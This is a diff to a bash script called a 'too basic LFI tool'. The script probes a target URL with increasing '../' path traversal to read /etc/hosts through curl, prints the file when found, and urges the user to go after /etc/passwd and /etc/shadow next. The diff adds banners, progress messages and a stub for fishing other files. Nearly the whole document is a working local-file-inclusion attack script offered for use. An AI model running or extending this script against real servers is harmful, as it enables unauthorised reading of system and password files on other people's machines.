@@ -9,8 +9,15 @@ RESET='\033[0m'
 BOLD=' \033[1m'
 
 echo -e "${BLUE}${BOLD}T O O   B A S I C   L F I   T O O L${RESET}"
-echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK"
 
+echo "       ┓    •   ┓┏•       ┓"
+echo "╋┏┓┏┓  ┣┓┏┓┏┓┏  ┃╋┓  ╋┏┓┏┓┃"
+echo "┗┗┛┗┛  ┗┛┗┻┛┗┗  ┗┛┗  ┗┗┛┗┛┗"
+
+
+echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK"
+echo 
+echo
 
 url="$1"
 
@@ -18,7 +25,8 @@ echo "Requesting the server which methods are allowed..."
 
 connexion_test=$(curl -s -o /dev/null -w "%{http_code}" "$url")
 
-if [ "$connexion_test" -ge 400 ] || [ "$connexion_test" -eq 0 ]; then 
+echo "$connexion_test"
+if [ "$connexion_test" -ge 408 ] || [ "$connexion_test" -eq 0 ]; then 
 echo -e "${RED}Maybe you should think about having an actual connexion lmao (check your fucking interfaces man)${RESET}"
 exit 1
 
@@ -41,27 +49,35 @@ echo -e "${RED}${BOLD}Server sets in no sniffing mode : *womp womp sound*${RESET
 
 fi
 
-echo "how deep is your love?" 
+echo 
+echo "How deep is your love, my deer?" 
 
 depth=5
-for ((i=1; i<=depth; i++)); do 
+for ((i=1; i<=depth; i++)); do
 query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
 url2="${url}${query}"
-echo "$url" 
+echo -e "${YELLOW}Stade ${i} recursion${RESET}"
+echo "$url2" 
 echo "Searching for /etc/hosts file..."
 file=$(curl -s "$url2")
-if  echo "$file" | grep -i "localhost" ; then 
+if  echo "$file" | grep -s -i "localhost" ; then 
+echo -e "${GREEN}${BOLD}It seems we find something interesting${RESET}"
+print=$(curl -s "$url2")
+echo -e "${GREEN}$print${RESET}"
 
-echo -e "${GREEN}It seems we find something interesting${RESET}"
 
 echo "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or /etc/shadow"
 echo "Have a wonderful look dude"
 exit 0
 else
 echo -e "${RED}Gotta dive deeper, my friend${RESET}"
-echo "Stade "$i" recursion"
 fi
 done 
 echo "25% finished"
 
+
 fi
+
+echo "Let's try something else"
+echo "Fishing for other files"
+
